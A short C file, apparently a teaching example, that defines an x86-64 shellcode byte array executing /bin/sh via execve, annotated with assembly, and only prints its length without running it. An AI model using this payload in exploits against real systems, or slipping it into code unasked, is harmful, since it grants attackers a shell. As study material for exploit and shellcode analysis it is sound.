#include <stdio.h>
#include <unistd.h>

// Simple shellcode that executes /bin/sh
// This is for educational purposes only
unsigned char shellcode[] = 
    "\x48\x31\xd2"                // xor rdx, rdx
    "\x48\x31\xf6"                // xor rsi, rsi
    "\x48\xbb\x2f\x62\x69\x6e"    // mov rbx, '/bin'
    "\x2f\x73\x68\x00"            // '/sh\0'
    "\x53"                        // push rbx
    "\x48\x89\xe7"                // mov rdi, rsp
    "\x48\x31\xc0"                // xor rax, rax
    "\xb0\x3b"                    // mov al, 59 (sys_execve)
    "\x0f\x05";                   // syscall

int main() {
    printf("Shellcode length: %lu bytes\n", sizeof(shellcode) - 1);
    return 0;
}
